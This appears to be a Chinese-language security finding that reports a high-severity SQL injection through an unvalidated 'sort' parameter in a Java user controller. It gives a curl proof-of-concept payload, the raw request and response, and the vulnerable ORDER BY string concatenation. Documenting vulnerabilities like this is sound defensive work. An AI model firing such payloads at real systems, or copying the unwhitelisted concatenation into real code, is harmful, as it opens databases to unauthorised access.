# 用户查询 - SQL 注入
**类型**：SQL 注入
**位置**：UserController.java:96
**CVSS 评分**：8.1
**严重性**：高
**触发条件**：sort 参数传入 SQL 元字符
**Payload**：
    curl -s "http://app.intranet/api/users?sort=id%2C(SELECT+1)"
**时间**：2026-09-24T10:22:05+08:00
**环境**：same-host
**raw_request**：
    GET /api/users?sort=id,(SELECT 1) HTTP/1.1
    Host: app.intranet
**raw_response**：
    HTTP/1.1 200 OK
    Content-Type: application/json
    {"total": 42, "rows": []}
**事实依据**：
    // UserController.java:96 - ORDER BY 拼接无白名单
    String sql = "SELECT id,name FROM users ORDER BY " + req.getParameter("sort");
